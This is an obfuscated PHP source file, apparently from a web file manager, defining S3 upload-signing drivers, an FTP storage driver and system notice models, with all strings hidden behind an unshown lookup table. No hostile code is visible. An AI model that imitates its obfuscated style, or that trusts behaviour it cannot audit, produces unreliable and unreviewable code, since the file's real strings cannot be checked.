<?php
 goto f”Ó¡Ñ†¤; C¹—ƒ…×Â³: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($Ù ìÌïÊ) { parent::__construct($Ù ìÌïÊ); $this->setSignVersion($_SERVER[öæÛ¿©¿][248]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($µÑ”¯«) { parent::__construct($µÑ”¯«); $this->setSignVersion($_SERVER[öæÛ¿©¿][248]); } public function uploadFormData($ã±À©×ü, $ÕÍ¨ØÈ = 3600) { $ĞÊ¤åíÂ =& $_SERVER[öæÛ¿©¿]; $ÂãèÅ“º = $ĞÊ¤åíÂ[230]; $ÓŠ˜ò¬ = $ĞÊ¤åíÂ[258]; $Ø’‹ßáû = $ĞÊ¤åíÂ[62]; $¥åÆÛšº = gmdate($ĞÊ¤åíÂ[259]); $âà™´Š‚ = gmdate($ĞÊ¤åíÂ[260]); $£ØëĞı… = $ĞÊ¤åíÂ[261]; $±Éâ­š¢ = $ÕÍ¨ØÈ . $ĞÊ¤åíÂ[12]; $™³ìŠÅ‡ = $ĞÊ¤åíÂ[262]; $Æ”¦ ³ = array($this->accessKey, $âà™´Š‚, $this->region, $Ø’‹ßáû, $£ØëĞı…); $©—œ‹ƒ = implode($ĞÊ¤åíÂ[8], $Æ”¦ ³); $ï¾•ÉÏá = array($ĞÊ¤åíÂ[263] => gmdate($ĞÊ¤åíÂ[1470], strtotime($ĞÊ¤åíÂ[265])), $ĞÊ¤åíÂ[266] => array(array($ĞÊ¤åíÂ[267] => $this->bucket), array($ĞÊ¤åíÂ[307] => $ÂãèÅ“º), array($ĞÊ¤åíÂ[268], $ĞÊ¤åíÂ[269], $ĞÊ¤åíÂ[12]), array($ĞÊ¤åíÂ[268], $ĞÊ¤åíÂ[270], $ĞÊ¤åíÂ[12]), array($ĞÊ¤åíÂ[268], $ĞÊ¤åíÂ[308], $ĞÊ¤åíÂ[12]), array($ĞÊ¤åíÂ[271] => $™³ìŠÅ‡), array($ĞÊ¤åíÂ[272] => $©—œ‹ƒ), array($ĞÊ¤åíÂ[273] => $ÓŠ˜ò¬), array($ĞÊ¤åíÂ[274] => $¥åÆÛšº), array($ĞÊ¤åíÂ[275] => $±Éâ­š¢))); $–¯¬Â› = base64_encode(json_encode($ï¾•ÉÏá)); $ø•éíÉİ = hash_hmac($ĞÊ¤åíÂ[276], $âà™´Š‚, $ĞÊ¤åíÂ[277] . $this->secret, !0); $“åòÕâ¤ = hash_hmac($ĞÊ¤åíÂ[276], $this->region, $ø•éíÉİ, !0); $ø‰ñÊå¿ = hash_hmac($ĞÊ¤åíÂ[276], $Ø’‹ßáû, $“åòÕâ¤, !0); $‰¡³Ë‘‘ = hash_hmac($ĞÊ¤åíÂ[276], $£ØëĞı…, $ø‰ñÊå¿, !0); $…œ•çù÷ = hash_hmac($ĞÊ¤åíÂ[276], $–¯¬Â›, $‰¡³Ë‘‘); $äÜß•Ô = array($ĞÊ¤åíÂ[247] => $ĞÊ¤åíÂ[12], $ĞÊ¤åíÂ[295] => $ĞÊ¤åíÂ[12], $ĞÊ¤åíÂ[307] => $ÂãèÅ“º, $ĞÊ¤åíÂ[271] => $™³ìŠÅ‡, $ĞÊ¤åíÂ[278] => $–¯¬Â›, $ĞÊ¤åíÂ[309] => $©—œ‹ƒ, $ĞÊ¤åíÂ[310] => $ÓŠ˜ò¬, $ĞÊ¤åíÂ[311] => $¥åÆÛšº, $ĞÊ¤åíÂ[312] => $±Éâ­š¢, $ĞÊ¤åíÂ[313] => $…œ•çù÷, $ĞÊ¤åíÂ[207] => $this->getHost()); return $äÜß•Ô; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($€ÂÀ’§) { parent::__construct(); if (count($€ÂÀ’§) > 0) { $this->_init($€ÂÀ’§); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¿ÇÄÔ™—) { $¥ò­Îˆª =& $_SERVER[öæÛ¿©¿]; global $config; $this->appCharset = $config[$¥ò­Îˆª[1591]]; $this->systemCharset = $config[$¥ò­Îˆª[1592]]; if (isset($¿ÇÄÔ™—[$¥ò­Îˆª[1593]]) && $¿ÇÄÔ™—[$¥ò­Îˆª[1593]]) { $this->systemCharset = $¿ÇÄÔ™—[$¥ò­Îˆª[1593]]; } } public function iconvApp($¯‚ûì‚Ï) { return $this->iconvTo($¯‚ûì‚Ï, $this->systemCharset, $this->appCharset); } public function iconvSystem($Ã“÷Éå) { return $this->iconvTo($Ã“÷Éå, $this->appCharset, $this->systemCharset); } public function getPathOuter($§‘ªÇäñ) { $„ë‚âÇä =& $_SERVER[öæÛ¿©¿]; $šÕõ‚»” = $this->iconvApp($this->pathBase); $§‘ªÇäñ = $this->iconvApp($§‘ªÇäñ); if (substr($šÕõ‚»”, 0, 2) == $„ë‚âÇä[1468]) { $šÕõ‚»” = BASIC_PATH . substr($šÕõ‚»”, 2); } if (substr($§‘ªÇäñ, 0, 2) == $„ë‚âÇä[1468]) { $§‘ªÇäñ = BASIC_PATH . substr($§‘ªÇäñ, 2); } $šÕõ‚»” = KodIO::clear($šÕõ‚»”); $§‘ªÇäñ = KodIO::clear($§‘ªÇäñ); $§‘ªÇäñ = substr($§‘ªÇäñ, strlen($šÕõ‚»”)); if (empty($this->pathDriver)) { return $§‘ªÇäñ; } return $this->pathDriver . $„ë‚âÇä[8] . ltrim($§‘ªÇäñ, $„ë‚âÇä[8]); } private function _init($¨ôŞ•¦ú = array()) { $ı¹ò„¥« =& $_SERVER[öæÛ¿©¿]; if (!function_exists($ı¹ò„¥«[1594])) { throw new Exception(LNG($ı¹ò„¥«[1595])); } $this->config = $¨ôŞ•¦ú; $this->charsetReset($¨ôŞ•¦ú); foreach ($¨ôŞ•¦ú as $‚‡ú˜–‹ => $í¹ŞäÀ) { if (isset($this->{$‚‡ú˜–‹})) { $this->{$‚‡ú˜–‹} = $í¹ŞäÀ; } } return $this->_login($¨ôŞ•¦ú); } private function _login($£á‹Ÿğ) { $òê‹ƒ‰ú =& $_SERVER[öæÛ¿©¿]; static $“…Æ¯Ê = array(); $ºï³·Šş = md5(json_encode($£á‹Ÿğ)); if (isset($“…Æ¯Ê[$ºï³·Šş])) { foreach ($“…Æ¯Ê[$ºï³·Šş] as $ÁÄÚ…ª¨ => $š¼ó§Ø) { $this->{$ÁÄÚ…ª¨} = $š¼ó§Ø; } return !0; } $ŒˆÕÃ’ = parse_url(trim($this->server, $òê‹ƒ‰ú[8])); $this->host = $ŒˆÕÃ’[$òê‹ƒ‰ú[207]]; $ªûíä¾´ = isset($ŒˆÕÃ’[$òê‹ƒ‰ú[206]]) && $ŒˆÕÃ’[$òê‹ƒ‰ú[206]] == $òê‹ƒ‰ú[1596] ? !0 : !1; $this->scheme = $ªûíä¾´ ? $òê‹ƒ‰ú[1597] : $òê‹ƒ‰ú[1598]; $this->port = isset($ŒˆÕÃ’[$òê‹ƒ‰ú[208]]) ? $ŒˆÕÃ’[$òê‹ƒ‰ú[208]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($òê‹ƒ‰ú[1599]) . $this->host . $òê‹ƒ‰ú[4] . $this->port, !0); return !1; } $î‰†Áäş = @ftp_login($this->connect, $this->username, $this->userpass); if (!$î‰†Áäş) { $this->writeLog(LNG($òê‹ƒ‰ú[1600]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $òê‹ƒ‰ú[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $©ıÏ¨ = $this->pasv == $òê‹ƒ‰ú[91] ? !0 : !1; @ftp_pasv($this->connect, $©ıÏ¨); $“…Æ¯Ê[$ºï³·Šş] = array($òê‹ƒ‰ú[1601] => $this->connect, $òê‹ƒ‰ú[207] => $this->host, $òê‹ƒ‰ú[206] => $this->scheme, $òê‹ƒ‰ú[208] => $this->port); return $î‰†Áäş; } private function _isconn($”¯ö‚Âƒ = true) { if (is_resource($this->connect)) { return !0; } if (!$”¯ö‚Âƒ) { return !1; } return $this->_login($this->config); } public function mkfile($ÊÉ´Ò‘á, $¥ñ…ˆüœ = '', $«„’«ìê = REPEAT_RENAME) { if ($this->setContent($ÊÉ´Ò‘á, $¥ñ…ˆüœ)) { return $this->getPathOuter($ÊÉ´Ò‘á); } $this->writeLog(LNG($_SERVER[öæÛ¿©¿][1602]), !0); return !1; } public function mkdir($ë†µºè€, $Ø¥¸ü½™ = REPEAT_SKIP) { $ººÏõ =& $_SERVER[öæÛ¿©¿]; if (!$ë†µºè€ || $ë†µºè€ == $ººÏõ[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ë†µºè€ = $this->iconvSystem($ë†µºè€); if ($this->_isFolder($ë†µºè€) || @ftp_mkdir($this->connect, $ë†µºè€)) { return $this->getPathOuter($ë†µºè€); } if (!$this->mkdir($this->pathFather($ë†µºè€))) { return !1; } if ($ë†µºè€ = @ftp_mkdir($this->connect, $ë†µºè€)) { return $this->getPathOuter($ë†µºè€); } $èùª™³¯ = __FUNCTION__ . $ººÏõ[1603]; $this->writeLog($èùª™³¯, !0); return !1; } public function copyFile($®Ç©ºàã, $éœĞÓ×¶) { if (!$this->_isconn()) { return !1; } $§·¶ó¦› = $this->pathThis($this->iconvSystem($®Ç©ºàã)); $Æå¥ë«ã = $this->tempFile($§·¶ó¦›); $¯±ş––ô = $this->iconvApp($Æå¥ë«ã); $this->download($®Ç©ºàã, $¯±ş––ô); $¬òïÄĞ = $this->upload($éœĞÓ×¶, $¯±ş––ô); $this->tempFileRemve($Æå¥ë«ã); return $¬òïÄĞ; } public function moveFile($ØÍ­ŞŞ¶, $şÃÇ») { if (!$this->_isconn()) { return !1; } $ØÍ­ŞŞ¶ = $this->iconvSystem($ØÍ­ŞŞ¶); $şÃÇ» = $this->iconvSystem($şÃÇ»); $šğê¾óÛ = @ftp_rename($this->connect, $ØÍ­ŞŞ¶, $şÃÇ»); if (!$šğê¾óÛ) { $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][1603], !0); return !1; } return $this->getPathOuter($şÃÇ»); } public function delFile($›…ŸÏ±“) { if (!$this->_isconn()) { return !1; } $›…ŸÏ±“ = $this->iconvSystem($›…ŸÏ±“); $ğÕŠßßª = @ftp_delete($this->connect, $›…ŸÏ±“); if (!$ğÕŠßßª) { $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][1603], !0); } return $ğÕŠßßª; } public function delFolder($õÂîµ¾œ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¡ûÛÍÜê = $ÜûÔ°š = array(); $this->fileList($õÂîµ¾œ, $¡ûÛÍÜê, $ÜûÔ°š, !0); $this->listItemCache = !0; foreach ($ÜûÔ°š as $åíšÂ™ò) { $Õ´ãü¤ = $this->iconvSystem($åíšÂ™ò[$_SERVER[öæÛ¿©¿][32]]); $«Ê·İ·¹ = @ftp_delete($this->connect, $Õ´ãü¤); if (!$«Ê·İ·¹) { return !1; } } foreach ($¡ûÛÍÜê as $Õ´ãü¤) { $Õ´ãü¤ = $this->iconvSystem($Õ´ãü¤); $«Ê·İ·¹ = @ftp_rmdir($this->connect, $Õ´ãü¤); if (!$«Ê·İ·¹) { return !1; } } $õÂîµ¾œ = $this->iconvSystem($õÂîµ¾œ); return @ftp_rmdir($this->connect, $õÂîµ¾œ); } public function rename($­³¯Çˆ¿, $ğì§®»¨) { $´À†áªÇ =& $_SERVER[öæÛ¿©¿]; if (!$this->_isconn()) { return !1; } $»Ô±ÒÆˆ = $this->fileNameAuto($this->pathFather($­³¯Çˆ¿), $ğì§®»¨); $»Ô±ÒÆˆ = $this->iconvSystem($»Ô±ÒÆˆ); $­³¯Çˆ¿ = $this->iconvSystem($­³¯Çˆ¿); $ÚåÔ¿¨ = $this->pathFather($­³¯Çˆ¿); $åìƒ…î’ = rtrim($ÚåÔ¿¨, $´À†áªÇ[8]) . $´À†áªÇ[8] . $»Ô±ÒÆˆ; $”¥áİùÈ = @ftp_rename($this->connect, $­³¯Çˆ¿, $åìƒ…î’); if (!$”¥áİùÈ) { $this->writeLog(__FUNCTION__ . $´À†áªÇ[1603], !0); return !1; } $åìƒ…î’ = $this->iconvApp($åìƒ…î’); return $this->getPathOuter($åìƒ…î’); } private function folderInfo($µ”ô‡§, $ï«ÃŞ»› = false) { $¢§—›“‹ =& $_SERVER[öæÛ¿©¿]; $èö±Ïäô = array($¢§—›“‹[32] => $this->pathThis($µ”ô‡§), $¢§—›“‹[87] => $this->getPathOuter($¢§—›“‹[8] . $µ”ô‡§), $¢§—›“‹[33] => $¢§—›“‹[78]); if ($ï«ÃŞ»›) { return $èö±Ïäô; } $èö±Ïäô[$¢§—›“‹[232]] = $èö±Ïäô[$¢§—›“‹[88]] = 0; $èö±Ïäô[$¢§—›“‹[233]] = $èö±Ïäô[$¢§—›“‹[234]] = !0; return $èö±Ïäô; } private function fileInfo($•ó‘Ø , $›¯‘ÄÏİ = false, $¹úÓä—£ = array()) { $ªªÜàºä =& $_SERVER[öæÛ¿©¿]; $öÊ¦µÖ = array($ªªÜàºä[32] => $this->pathThis($•ó‘Ø ), $ªªÜàºä[87] => $this->getPathOuter($ªªÜàºä[8] . $•ó‘Ø ), $ªªÜàºä[33] => $ªªÜàºä[231], $ªªÜàºä[79] => isset($¹úÓä—£[$ªªÜàºä[79]]) ? $¹úÓä—£[$ªªÜàºä[79]] : 0, $ªªÜàºä[167] => $this->ext($•ó‘Ø )); if ($›¯‘ÄÏİ) { return $öÊ¦µÖ; } $öÊ¦µÖ[$ªªÜàºä[232]] = $öÊ¦µÖ[$ªªÜàºä[88]] = 0; $öÊ¦µÖ[$ªªÜàºä[233]] = $öÊ¦µÖ[$ªªÜàºä[234]] = !0; $÷¹Ç¿ó„ = $this->iconvSystem($•ó‘Ø ); $öÊ¦µÖ[$ªªÜàºä[88]] = @ftp_mdtm($this->connect, $÷¹Ç¿ó„); if (empty($¹úÓä—£)) { $¹úÓä—£ = $this->objectMeta($•ó‘Ø ); if (!$¹úÓä—£) { return $öÊ¦µÖ; } } $öÊ¦µÖ[$ªªÜàºä[79]] = $¹úÓä—£[$ªªÜàºä[79]]; return $öÊ¦µÖ; } public function size($£ßø’ü) { $­¿Á©êË = $this->objectMeta($£ßø’ü); return $­¿Á©êË ? $­¿Á©êË[$_SERVER[öæÛ¿©¿][79]] : 0; } public function info($¦¶€ìÑÅ) { if ($this->isFile($¦¶€ìÑÅ)) { return $this->fileInfo($¦¶€ìÑÅ, 0); } else { if ($this->isFolder($¦¶€ìÑÅ)) { return $this->folderInfo($¦¶€ìÑÅ); } } return !1; } private function fileList($¦»£ÛÀ–, &$«Ô„£³ƒ, &$úş¬ş», $«”ˆŠÌà = false) { $ã„¯ºŒû =& $_SERVER[öæÛ¿©¿]; $¦»£ÛÀ– = $this->iconvSystem($¦»£ÛÀ–); if (!$this->isFolder($¦»£ÛÀ–)) { return !1; } $¦»£ÛÀ– = rtrim($¦»£ÛÀ–, $ã„¯ºŒû[8]) . $ã„¯ºŒû[8]; check_abort(); $şÉ…¯£å = @ftp_rawlist($this->connect, $¦»£ÛÀ–); if (!$şÉ…¯£å) { $şÉ…¯£å = array(); } $‚ä‚ûŒ = array($ã„¯ºŒû[10] => 1, $ã„¯ºŒû[1413] => 1); foreach ($şÉ…¯£å as $Ú„™´¾ü) { $®ñû°¯ë = $this->_listItem($Ú„™´¾ü); if ($®ñû°¯ë[0] == $ã„¯ºŒû[851]) { continue; } $é„¬ÒÜ× = $®ñû°¯ë[8]; if (empty($é„¬ÒÜ×) && $é„¬ÒÜ× !== $ã„¯ºŒû[229] || isset($‚ä‚ûŒ[$é„¬ÒÜ×])) { continue; } $é„¬ÒÜ× = $this->iconvApp($¦»£ÛÀ– . ltrim($é„¬ÒÜ×, $ã„¯ºŒû[8])); $šèä€°ç = array($ã„¯ºŒû[32] => $é„¬ÒÜ×, $ã„¯ºŒû[33] => $ã„¯ºŒû[231], $ã„¯ºŒû[79] => $®ñû°¯ë[4]); if (substr($Ú„™´¾ü, 0, 1) == $ã„¯ºŒû[1604]) { $šèä€°ç[$ã„¯ºŒû[33]] = $ã„¯ºŒû[78]; $šèä€°ç[$ã„¯ºŒû[79]] = 0; } $„¸øÈ®á = $šèä€°ç[$ã„¯ºŒû[33]] == $ã„¯ºŒû[78] ? !0 : !1; $this->cacheMethodInfoSet($é„¬ÒÜ×, $„¸øÈ®á, $šèä€°ç); if ($„¸øÈ®á) { $«Ô„£³ƒ[] = $é„¬ÒÜ×; if ($«”ˆŠÌà) { $this->fileList($é„¬ÒÜ×, $«Ô„£³ƒ, $úş¬ş», $«”ˆŠÌà); } continue; } $úş¬ş»[] = $šèä€°ç; } $this->cacheMethodInfoSet($¦»£ÛÀ–, !0); } private function _listItem($ä¯Ì»ñ) { if (empty($ä¯Ì»ñ)) { return array(); } $ŒŞ¿Š¾ = preg_split($_SERVER[öæÛ¿©¿][1605], $ä¯Ì»ñ); if (count($ŒŞ¿Š¾) <= 9) { return $ŒŞ¿Š¾; } $ŒŞ¿Š¾[8] = trim(substr($ä¯Ì»ñ, strpos($ä¯Ì»ñ, $ŒŞ¿Š¾[7]) + strlen($ŒŞ¿Š¾[7]))); return array_splice($ŒŞ¿Š¾, 0, 9); } public function listPath($¦ÕÓ·›², $Æ÷¾Áı = false) { $‚®ÅıÆ =& $_SERVER[öæÛ¿©¿]; if (!$this->_isconn()) { return !1; } $ÅŸ»ÙÍ = $Šúùô÷ = array(); $this->fileList($¦ÕÓ·›², $ÅŸ»ÙÍ, $Šúùô÷); foreach ($ÅŸ»ÙÍ as $½Üé«ì‘ => $™éÆóü‹) { $ÅŸ»ÙÍ[$½Üé«ì‘] = $this->folderInfo($™éÆóü‹, $Æ÷¾Áı); } foreach ($Šúùô÷ as $½Üé«ì‘ => $™éÆóü‹) { $Šúùô÷[$½Üé«ì‘] = $this->fileInfo($™éÆóü‹[$‚®ÅıÆ[32]], $Æ÷¾Áı, $™éÆóü‹); } return array($‚®ÅıÆ[85] => $ÅŸ»ÙÍ, $‚®ÅıÆ[86] => $Šúùô÷); } public function has($Äí¬¡—ê, $ °éİø = false, $ôéª«¤ˆ = true) { $ñ‡éƒ¡£ =& $_SERVER[öæÛ¿©¿]; $íÔÚŠº = $îúş®Š = array(); $àùÚ«º­ = $ °éİø ? !0 : !1; $this->fileList($Äí¬¡—ê, $íÔÚŠº, $îúş®Š, $àùÚ«º­); if ($ °éİø) { return array($ñ‡éƒ¡£[240] => count($îúş®Š), $ñ‡éƒ¡£[241] => count($íÔÚŠº)); } if ($ôéª«¤ˆ) { if (count($îúş®Š)) { return !0; } } else { if (count($íÔÚŠº)) { return !0; } } return !1; } public function listAll($üÄš£’ô) { $¹¶«æÌÕ =& $_SERVER[öæÛ¿©¿]; if (!$this->_isconn()) { return !1; } $Š¯åĞÑ» = $µ¹«öÍÇ = array(); $this->fileList($üÄš£’ô, $Š¯åĞÑ», $µ¹«öÍÇ, !0); $Ó¤»æ„¦ = array_to_keyvalue($µ¹«öÍÇ, $¹¶«æÌÕ[32]); foreach ($Š¯åĞÑ» as $¦ŠíÚğğ) { if (is_string($¦ŠíÚğğ)) { $Ó¤»æ„¦[$¦ŠíÚğğ] = array($¹¶«æÌÕ[79] => 0); } } return $this->listAllFiles($üÄš£’ô, $Ó¤»æ„¦); } public function getContent($˜üİÇ·–) { if (!$this->_isconn()) { return !1; } $˜üİÇ·– = $this->iconvSystem($˜üİÇ·–); return $this->fileSubstr($˜üİÇ·–); } public function setContent($¸†ƒŞŠ, $²«©›„ì = '') { if (!$this->_isconn()) { return !1; } $Ëá£á = $this->pathThis($this->iconvSystem($¸†ƒŞŠ)); $œ¹¦®‰à = $this->tempFile($Ëá£á); file_put_contents($œ¹¦®‰à, $²«©›„ì); $¯¾ÇÈ˜Ş = $this->upload($¸†ƒŞŠ, $this->iconvApp($œ¹¦®‰à)); $this->tempFileRemve($œ¹¦®‰à); return $¯¾ÇÈ˜Ş; } public function fileSubstr($—çÏ£Ïß, $Îß©‡èí = 0, $›‘Ÿş·¼ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($—çÏ£Ïß, $Îß©‡èí, $›‘Ÿş·¼); } private function ftpRequest($Ç»ß¡»Œ, $ÂØ‚¤ñø = 0, $ ŸŞº¶Ä = false) { $İ‚ï´‚ =& $_SERVER[öæÛ¿©¿]; $Ç»ß¡»Œ = $İ‚ï´‚[8] . ltrim(str_ltrim($Ç»ß¡»Œ, $this->ftpPath), $İ‚ï´‚[8]); $Ç»ß¡»Œ = $this->iconvSystem($Ç»ß¡»Œ); $é½Îğ = $this->scheme . $this->host . $İ‚ï´‚[4] . $this->port; $‘æà×¿– = curl_init(); curl_setopt($‘æà×¿–, CURLOPT_URL, $é½Îğ . $this->pathEncode($Ç»ß¡»Œ)); curl_setopt($‘æà×¿–, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ ŸŞº¶Ä) { $ÏÁ¤·Šµ = $ÂØ‚¤ñø + $ ŸŞº¶Ä - 1; curl_setopt($‘æà×¿–, CURLOPT_RANGE, "{$ÂØ‚¤ñø}\55{$ÏÁ¤·Šµ}"); } curl_setopt($‘æà×¿–, CURLOPT_RETURNTRANSFER, 1); $Î‚Ö¹ƒ˜ = curl_exec($‘æà×¿–); curl_close($‘æà×¿–); return $Î‚Ö¹ƒ˜; } public function upload($ ûÄíî, $Ãö¹’œ», $šÔ³Â‘© = false, $Õ–øüµç = REPEAT_REPLACE) { if (!$Ãö¹’œ» || !@file_exists($Ãö¹’œ»)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ ûÄíî))) { return !1; } $ ûÄíî = $this->iconvSystem($ ûÄíî); $Ãö¹’œ» = $this->iconvSystem($Ãö¹’œ»); $æÅ‘ñ‘† = ftp_nb_put($this->connect, $ ûÄíî, $Ãö¹’œ», FTP_BINARY); while ($æÅ‘ñ‘† == FTP_MOREDATA) { $æÅ‘ñ‘† = ftp_nb_continue($this->connect); } if ($æÅ‘ñ‘† != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][1603], !0); return !1; } return $this->getPathOuter($ ûÄíî); } public function download($›½¢·¥š, $æÓï¦•Ÿ = '') { if (!$this->_isconn()) { return !1; } $Ùº×À»‹ = $this->pathFather($æÓï¦•Ÿ); if (!IO::mkdir($Ùº×À»‹)) { return !1; } $›½¢·¥š = $this->iconvSystem($›½¢·¥š); $æÓï¦•Ÿ = $this->iconvSystem($æÓï¦•Ÿ); $Ğé¨ˆ‹á = ftp_nb_get($this->connect, $æÓï¦•Ÿ, $›½¢·¥š, FTP_BINARY); while ($Ğé¨ˆ‹á == FTP_MOREDATA) { $Ğé¨ˆ‹á = ftp_nb_continue($this->connect); } if ($Ğé¨ˆ‹á != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][1603], !0); return !1; } return $this->iconvApp($æÓï¦•Ÿ); } public function exist($¢³·¨Û¾) { return $this->isFile($¢³·¨Û¾) || $this->isFolder($¢³·¨Û¾); } public function isFile($†ÇÎ£í—) { return !$this->isFolder($†ÇÎ£í—) && $this->objectMeta($†ÇÎ£í—); } public function isFolder($½•õ½Ø) { return $this->cacheMethod($_SERVER[öæÛ¿©¿][178], $½•õ½Ø); } protected function objectMeta($ğÙ”±´•) { return $this->cacheMethod($_SERVER[öæÛ¿©¿][180], $ğÙ”±´•); } protected function _objectMeta($½ù¹Î…—) { $Õ”¤Ììà =& $_SERVER[öæÛ¿©¿]; if ($½ù¹Î…— == $Õ”¤Ììà[12] || $½ù¹Î…— == $Õ”¤Ììà[8]) { return array(); } if (!$this->_isconn()) { return !1; } $½ù¹Î…— = $this->iconvSystem($½ù¹Î…—); $”‹¶œª† = array($Õ”¤Ììà[32] => $this->iconvApp($½ù¹Î…—), $Õ”¤Ììà[33] => $Õ”¤Ììà[231], $Õ”¤Ììà[79] => 0); $†ÉÛÒÙï = @ftp_size($this->connect, $½ù¹Î…—); if ($†ÉÛÒÙï != -1) { $”‹¶œª†[$Õ”¤Ììà[79]] = $†ÉÛÒÙï; } else { $ò‹‘ŸÎô = @ftp_chdir($this->connect, $½ù¹Î…—); if (!$ò‹‘ŸÎô) { return !1; } @ftp_chdir($this->connect, $Õ”¤Ììà[8]); $”‹¶œª†[$Õ”¤Ììà[33]] = $Õ”¤Ììà[78]; } return $”‹¶œª†; } protected function _isFolder($ºü•‹ø×) { $şâ·™šÀ =& $_SERVER[öæÛ¿©¿]; if ($ºü•‹ø× == $şâ·™šÀ[12] || $ºü•‹ø× == $şâ·™šÀ[8]) { return !0; } $Ö•ƒË = $this->_objectMeta($ºü•‹ø×); return isset($Ö•ƒË[$şâ·™šÀ[33]]) && $Ö•ƒË[$şâ·™šÀ[33]] == $şâ·™šÀ[78] ? !0 : !1; } } goto e¨Òä†¿Á; cãÔ¯¸Í­‰: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\x6e\157\164\x69\143\x65\114\x69\x73\164"; public $field = array("\x6e\x61\155\145", "\x63\157\156\x74\145\x6e\164", "\141\x75\164\150", "\155\x6f\144\145", "\164\151\x6d\x65", "\x74\x79\x70\x65", "\154\x65\166\145\x6c", "\x65\156\x61\142\x6c\x65", "\163\x6f\162\x74"); public function listData($¢÷Óİ¼Â = false, $›İÕ‰Û¾ = "\163\x6f\162\164", $»ô»‚­ = false) { return parent::listData($¢÷Óİ¼Â, $›İÕ‰Û¾, $»ô»‚­); } public function add($ßë”ë²Š) { $ğşÆ…Œ =& $_SERVER[öæÛ¿©¿]; $ÔßÆ±¡• = time(); if ($ßë”ë²Š[$ğşÆ…Œ[16]] == $ğşÆ…Œ[2608]) { $ÔßÆ±¡• = strtotime($ßë”ë²Š[$ğşÆ…Œ[205]]); } $ßë”ë²Š[$ğşÆ…Œ[205]] = $ÔßÆ±¡•; return parent::insert($ßë”ë²Š); } public function update($¥ïåŠ“ß, $í­ò›£Š) { $Á¤Éóü‚ =& $_SERVER[öæÛ¿©¿]; $ğÉ»Üòù = $this->listData($¥ïåŠ“ß); if (!$ğÉ»Üòù) { return !1; } $üĞ€÷‘™ = time(); if ($í­ò›£Š[$Á¤Éóü‚[16]] == $Á¤Éóü‚[2608]) { $üĞ€÷‘™ = strtotime($í­ò›£Š[$Á¤Éóü‚[205]]); } $í­ò›£Š[$Á¤Éóü‚[205]] = $üĞ€÷‘™; return parent::update($¥ïåŠ“ß, $í­ò›£Š); } public function remove($úÑû‰ëÂ) { $œ•äÁÊ’ = $this->listData($úÑû‰ëÂ); if (!$œ•äÁÊ’ || $œ•äÁÊ’[$_SERVER[öæÛ¿©¿][190]]) { return !1; } return parent::remove($úÑû‰ëÂ); } public function sort($äèåÀ, $ÈÂäéĞï) { return parent::update($äèåÀ, $ÈÂäéĞï); } public function enable($ùğŒÇŞ, $‰Õ¹®£˜) { return parent::update($ùğŒÇŞ, array($_SERVER[öæÛ¿©¿][2609] => $‰Õ¹®£˜)); } private function initUserOption() { $“±£—ñ¸ =& $_SERVER[öæÛ¿©¿]; $this->optionType = $“±£—ñ¸[2610]; $this->modelType = $“±£—ñ¸[2611]; $this->field = array($“±£—ñ¸[2612], $“±£—ñ¸[32], $“±£—ñ¸[205], $“±£—ñ¸[33], $“±£—ñ¸[2613], $“±£—ñ¸[842], $“±£—ñ¸[227]); } public function userNoticeGet($¦Û¯ë¤ = false) { $this->initUserOption(); return parent::listData($¦Û¯ë¤, $_SERVER[öæÛ¿©¿][483], !0); } public function userNoticeAdd($€€ÍÂ¹Ù) { $†¿‹©¦î =& $_SERVER[öæÛ¿©¿]; $this->initUserOption(); $Â·í˜ıñ = $this->findByKey($†¿‹©¦î[2612], $€€ÍÂ¹Ù[$†¿‹©¦î[483]]); if ($Â·í˜ıñ) { return !0; } $³¬ÈêÙ€ = array($†¿‹©¦î[2612] => $€€ÍÂ¹Ù[$†¿‹©¦î[483]], $†¿‹©¦î[32] => $€€ÍÂ¹Ù[$†¿‹©¦î[32]], $†¿‹©¦î[205] => $€€ÍÂ¹Ù[$†¿‹©¦î[205]], $†¿‹©¦î[33] => isset($€€ÍÂ¹Ù[$†¿‹©¦î[33]]) ? $€€ÍÂ¹Ù[$†¿‹©¦î[33]] : 1, $†¿‹©¦î[2613] => isset($€€ÍÂ¹Ù[$†¿‹©¦î[2613]]) ? $€€ÍÂ¹Ù[$†¿‹©¦î[2613]] : 0, $†¿‹©¦î[842] => 0, $†¿‹©¦î[227] => 0); return parent::insert($³¬ÈêÙ€); } public function userNoticeEdit($¾›Í²¥, $Ô«ñæ®±) { $this->initUserOption(); return parent::update($¾›Í²¥, $Ô«ñæ®±); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\145\155\137\x6f\160\x74\x69\157\x6e"; protected $jsonField = array("\x6d\x65\x6e\165", "\x72\157\x6c\x65", "\x72\157\x6c\x65\107\x72\157\x75\x70", "\162\145\x67\x69\x73\164", "\x65\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($³¿«Ô) { return "\x53\171\163\164\x65\155\117\x70\164\151\157\x6e\137{$³¿«Ô}"; } protected function optionDefault($óìŠˆ†Ÿ = '') { $ºÖÜÅ…î =& $_SERVER[öæÛ¿©¿]; if ($óìŠˆ†Ÿ == $ºÖÜÅ…î[12]) { return $GLOBALS[$ºÖÜÅ…î[6]][$ºÖÜÅ…î[468]]; } } } class SystemRecordModel extends ModelBaseLight { } 